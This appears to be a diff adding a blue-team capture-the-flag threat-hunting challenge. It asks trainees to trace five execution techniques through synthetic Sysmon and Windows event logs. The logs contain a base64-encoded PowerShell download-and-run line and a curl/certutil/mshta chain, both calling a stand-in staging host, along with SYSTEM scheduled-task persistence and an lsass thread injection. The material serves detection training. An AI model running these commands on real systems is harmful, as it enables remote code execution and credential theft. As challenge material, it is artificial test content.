@@ -1,0 +1,114 @@
+# ATT&CK TA0002 — Execution mini-campaign.
+#
+# A single workstation (WKSTN-12) executes five different payload
+# styles in twenty minutes. Sysmon + Windows event log + a small
+# 4688 audit slice. Hunter identifies the technique pivots.
+
+slug: tier-2-execution
+title: "Tier 2: Execution"
+description: |
+  WKSTN-12 went from "user opened email" to "five execution
+  techniques chained" in twenty minutes. Walk the Sysmon stream and
+  the security event log to identify each pivot — every technique
+  leaves a distinct argument shape, parent-child pair, or 4688 row.
+category: Threat Hunting
+team: blue
+difficulty: 3
+points: 400
+flag: "CTF{REDACTED}"
+tactic_id: TA0002
+docker_port: 2222
+profile: default-strict
+
+techniques:
+  - id: T1059.001
+    description: |
+      PowerShell — base64-encoded -EncodedCommand kicked off by a
+      WMI subscription handler. The encoded blob decodes to a
+      Net.WebClient downloader.
+    question:
+      prompt: |
+        What URL does the decoded PowerShell -EncodedCommand pull
+        its second stage from? (Full URL, including scheme.)
+      hint: |
+        Sysmon EventID 1 with `Image=powershell.exe` and an
+        `-EncodedCommand` argument. Base64-decode the blob in the
+        commandline.
+      answer: REDACTED
+
+  - id: T1059.003
+    description: |
+      Windows Command Shell — REDACTED /c chain piping curl into
+      certutil for an HTA pull.
+    question:
+      prompt: |
+        Which signed Windows binary does the REDACTED chain abuse
+        to download the HTA? (Just the filename, e.g. foo.exe.)
+      hint: |
+        Look at the REDACTED /c argument string for a LOLBin used
+        as an HTTP client.
+      answer: REDACTED
+
+  - id: T1053.005
+    description: |
+      Scheduled Task / Job — schtasks.exe creates a task running
+      every 10 minutes as SYSTEM, action is a wscript on a .vbs in
+      ProgramData.
+    question:
+      prompt: |
+        What is the exact task name the attacker registered with
+        schtasks /create? (Case-sensitive, as it appears after /tn.)
+      hint: |
+        4698 — A scheduled task was created. The TaskName field is
+        what you want.
+      answer: REDACTED
+
+  - id: T1106
+    description: |
+      Native API — a small loader calls NtCreateThreadEx via
+      ntdll.dll to start a thread inside lsass.exe. Sysmon
+      EventID 8 (CreateRemoteThread) captures the source/target.
+    question:
+      prompt: |
+        Which process injected a thread into lsass.exe via the
+        Native API call? (Full image path as it appears in the
+        Sysmon SourceImage field.)
+      hint: |
+        Sysmon EventID 8, TargetImage ends with `lsass.exe` — the
+        SourceImage is the loader.
+      answer: REDACTED
+
+  - id: T1204.002
+    description: |
+      User Execution — Malicious File. User double-clicked a
+      macro-laden .docm landed by the phishing payload. WINWORD.EXE
+      becomes the parent of a powershell.exe with -nop -w hidden.
+    question:
+      prompt: |
+        What filename did the user double-click to trigger the
+        macro execution? (Filename only, no path.)
+      hint: |
+        Sysmon EventID 1 with ParentImage ending in `WINWORD.EXE`
+        — the OriginalFileName or CommandLine of the parent points
+        at the document.
+      answer: REDACTED
+
+logs:
+  sysmon.json: |
+    {"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:31:04Z","Image":"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE","CommandLine":"\"WINWORD.EXE\" /n \"C:\\Users\\REDACTED\\Downloads\\REDACTED\"","User":"CORP\\REDACTED","ParentImage":"C:\\Program Files\\Mozilla Firefox\\firefox.exe"}
+    {"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:31:18Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -ep bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc3RhZ2UyLm1hbHdhcmUtY2RuLmV4YW1wbGUvcGF5bG9hZC5wczEnKQ==","User":"CORP\\REDACTED","ParentImage":"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"}
+    {"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:33:42Z","Image":"C:\\Windows\\System32\\REDACTED","CommandLine":"REDACTED /c curl -s http://stage2.malware-cdn.example/loader.txt | REDACTED -decode loader.txt loader.hta && mshta.exe loader.hta","User":"CORP\\REDACTED","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
+    {"host":"WKSTN-12","EventID":1,"UtcTime":"2026-05-15T08:35:11Z","Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks.exe /create /sc minute /mo 10 /tn REDACTED /tr \"wscript.exe C:\\ProgramData\\GoogleSync\\sync.vbs\" /ru SYSTEM /f","User":"CORP\\REDACTED","ParentImage":"C:\\Windows\\System32\\REDACTED"}
+    {"host":"WKSTN-12","EventID":8,"UtcTime":"2026-05-15T08:48:51Z","SourceImage":"C:\\Users\\REDACTED\\AppData\\Local\\Temp\\svc-helper.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","StartAddress":"0x00007FFB12340000","StartFunction":"NtCreateThreadEx"}
+  security.evtx.log: |
+    2026-05-15T08:35:11Z EventID=4698 Subject=CORP\REDACTED TaskName=\REDACTED TaskContent="<Actions><Exec><Command>wscript.exe</Command><Arguments>C:\ProgramData\GoogleSync\sync.vbs</Arguments></Exec></Actions>"
+    2026-05-15T08:31:18Z EventID=4688 NewProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ParentProcessName=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE TokenElevationType=%%1936
+    2026-05-15T08:33:42Z EventID=4688 NewProcessName=C:\Windows\System32\REDACTED ParentProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe TokenElevationType=%%1936
+    2026-05-15T08:33:43Z EventID=4688 NewProcessName=C:\Windows\System32\REDACTED ParentProcessName=C:\Windows\System32\REDACTED TokenElevationType=%%1936
+    2026-05-15T08:48:51Z EventID=4688 NewProcessName=REDACTED ParentProcessName=C:\Windows\System32\mshta.exe TokenElevationType=%%1936
+  decoder-hint.txt: |
+    The -EncodedCommand argument is standard PowerShell base64
+    (UTF-16LE) — but the smaller payload above was deliberately
+    encoded as UTF-8 base64 so it round-trips cleanly through
+    `printf '%s' '<blob>' | base64 -d` on a Linux box. Decode it
+    that way to read the URL.
